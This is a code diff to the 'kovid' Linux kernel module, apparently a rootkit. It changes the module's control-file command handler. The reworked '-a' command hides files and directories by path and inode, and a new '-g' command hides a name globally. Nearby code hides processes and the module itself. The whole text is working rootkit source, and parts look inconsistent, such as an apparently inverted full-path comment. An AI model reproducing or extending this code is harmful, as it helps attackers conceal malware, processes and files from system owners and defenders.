@@ -22,6 +22,7 @@
 #include <linux/tcp.h>
 #include <linux/kthread.h>
 #include <linux/kernel.h>
+#include <linux/namei.h>
 
 #include "lkm.h"
 #include "fs.h"
@@ -476,7 +477,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
             } else {
                 kv_hide_task_by_pid(val, 1, CHILDREN);
             }
-        /* hide kovid module */
+            /* hide kovid module */
         } else if(!strcmp(buf, "-h") && !op_lock) {
             static unsigned int msg_lock = 0;
             if(!msg_lock) {
@@ -490,33 +491,37 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
             /* list hidden tasks */
         } else if(!strcmp(buf, "-s")) {
             kv_show_saved_tasks();
-            /* add name to the list of hidden files/directories
-             * and inode, is present.
-             * */
+            /* hide file/directory based on inode */
         } else if(!strncmp(buf, "-a", MIN(2, size))) {
-            int ino = 0;
             char *s = &buf[3];
-            char *number_str;
             const char *tmp[] = {NULL, NULL};
-            int ok = 1;
+            struct kstat stat;
+            struct path path;
 
-            s[strcspn(s, "\n")] = 0;
-
-            // Find the first space in the input to separate name and number
-            number_str = strchr(s, ' ');
-            if (number_str) {
-                *number_str++ = '\0';
-            } else {
-                number_str = "";
+            if (!kern_path(s, LOOKUP_FOLLOW, &path)) {
+                if (!vfs_getattr(&path, &stat, STATX_BASIC_STATS, AT_STATX_SYNC_AS_STAT)) {
+                    if (*s != '/') {
+                        /** It is a full path */
+                        tmp[0] = s;
+                        fs_add_name_rw(tmp, stat.ino);
+                    } else {
+                        /** It is filename, no problem because we have path.dentry */
+                        const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
+                        path_put(&path);
+                        tmp[0] = f;
+                        fs_add_name_rw(tmp, stat.ino);
+                        kv_mem_free(&f);
+                    }
+                }
             }
-
-            *tmp = s;
-            if (*number_str)
-                ok = !kstrtoint(number_str, 10, &ino);
-
-            if (ok)
-                fs_add_name_rw(tmp, ino);
-            /* unhide file/directory */
+            /* hide file/directory globally */
+        } else if(!strncmp(buf, "-g", MIN(2, size))) {
+            char *s = &buf[3];
+            s[strcspn(s, " ")] = 0;
+            if (strlen(s)) {
+                const char *tmp[] = {s,NULL};
+                fs_add_name_rw(tmp, 0);
+            }
         } else if(!strncmp(buf, "-d", MIN(2, size))) {
             char *s = &buf[3];
             s[strcspn(s, " ")] = 0;
